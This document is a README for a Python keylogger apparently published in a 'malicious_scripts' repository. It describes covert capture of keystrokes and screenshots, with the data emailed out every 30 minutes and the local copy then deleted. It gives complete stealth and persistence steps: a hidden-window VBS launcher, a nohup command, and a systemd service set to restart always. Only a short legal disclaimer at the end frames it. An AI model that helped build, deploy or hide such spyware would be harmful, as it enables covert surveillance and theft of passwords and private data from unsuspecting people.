# Keylogger and Screenshot Capturing Script

## Overview
This Python script is a multifunctional tool that captures keystrokes, takes periodic screenshots, and securely stores data. It also includes stealth mode for running invisibly, automatic error recovery, and email notifications for sending collected data. After sending the email, the stored data is deleted to manage storage efficiently.

## Diagram
    ```text
    Keylogger and Screenshot Capturing Script
    ├── Start
    │   └── User starts the script (cross-platform: Windows/Linux)
    ├── Keylogging
    │   ├── Captures full words typed by the user
    │   └── Logs timestamps for each word
    ├── Screenshot Capturing
    │   └── Takes screenshots every 10 seconds
    ├── Data Storage
    │   ├── Stores keystrokes and screenshots
    │   ├── Windows: C:\keystroke_data
    │   └── Linux: /home/{user}/keystroke_data
    ├── Stealth Mode
    │   ├── Windows: Uses `pythonw.exe` and `.vbs` script
    │   └── Linux: Runs with `nohup` or as a systemd service
    ├── Data Encryption
    │   └── Encrypts stored data for security
    ├── Email Notification
    │   ├── Sends encrypted data via email every 30 minutes
    │   └── Attaches a zipped folder with keystrokes and screenshots
    ├── Data Deletion
    │   └── Deletes the folder after email is sent
    ├── Error Handling
    │   ├── Logs errors to a file
    │   └── Automatically restarts the script on failure
    └── Loop
        ├── Continuously captures and processes data
        └── Stops only when the script is manually terminated


## Features
1. **Keylogging**:
   - Captures full words typed by the user.
   - Logs timestamps for each word.
   - Encrypts the keystroke data before saving.

2. **Screenshot Capturing**:
   - Takes screenshots periodically (default: every 10 seconds).
   - Stores screenshots in a designated folder.

3. **Stealth Mode**:
   - Runs invisibly in the background.
   - For Windows: Uses `pythonw.exe` and `.vbs` script for silent execution.
   - For Linux: Runs using `nohup` or as a background service.

4. **Error Handling**:
   - Catches exceptions and logs errors.
   - Automatically restarts on failure.

5. **Email Notification**:
   - Sends an email every 30 minutes with the collected data.
   - Zips the data folder for transmission.
   - Deletes the folder after successful email delivery.

6. **Cross-Platform**:
   - Works on both Windows and Linux.
   - Creates platform-specific storage folders:
     - Windows: `C:\keystroke_data`
     - Linux: `/home/{user}/keystroke_data`

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/your-repo/keylogger-script.git
   cd keylogger-script
   ```

2. Install required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Modify the email configuration in the script:
   - Replace `your_email@example.com` and `recipient_email@example.com` with actual email addresses.
   - Configure SMTP settings for your email provider.

## Running the Script

### Windows
1. Use `pythonw.exe` to run the script invisibly:
   ```cmd
   pythonw.exe path\to\script.py
   ```

2. To automate silent execution, create a `.vbs` file with the following content:
   ```vbscript
   Set WshShell = CreateObject("WScript.Shell")
   WshShell.Run "pythonw.exe C:\path\to\your\script.py", 0, False
   ```
   - Double-click the `.vbs` file to start the script in stealth mode.

### Linux
1. Run the script in the background:
   ```bash
   nohup python3 script.py > /dev/null 2>&1 &
   ```

2. Optionally, create a systemd service for automatic startup:
   - Create a file `/etc/systemd/system/keylogger.service`:
     ```ini
     [Unit]
     Description=Keylogger Script
     
     [Service]
     ExecStart=/usr/bin/python3 /path/to/script.py
     Restart=always
     
     [Install]
     WantedBy=multi-user.target
     ```
   - Enable and start the service:
     ```bash
     sudo systemctl enable keylogger.service
     sudo systemctl start keylogger.service
     ```

## Configuration
- Screenshot Interval: Change the `screenshot_interval` variable in the script.
- Data Encryption: An encryption key is generated automatically and saved as `encryption_key.key`.
- Email Sending Interval: Modify the logic for sending emails to adjust the timing.

## Folder Structure
- **Windows**: `C:\keystroke_data`
- **Linux**: `/home/{user}/keystroke_data`

The folder stores:
- `keystrokes.txt`: Logs of typed words with timestamps.
- Screenshots: Periodically captured images.

## Security
- Keystroke data is encrypted using the `cryptography.Fernet` library.
- Ensure the `encryption_key.key` file is stored securely.

## Legal Notice
This script should only be used for ethical purposes and in compliance with local laws and regulations. Unauthorized use of this tool to monitor others' activity without consent is strictly prohibited and may be illegal.

## Troubleshooting
- **Error Recovery**: The script automatically restarts on failure and logs errors in `error_log.txt`.
- **SMTP Issues**: Ensure correct SMTP credentials and server settings.

## Contributions
Feel free to fork the repository and submit pull requests for improvements or new features.

## License
This project is licensed under the MIT License. See the [LICENSE](https://github.com/dhruvgarg31/malicious_scripts/blob/master/Python_Keylogger/LICENSE) file for details.
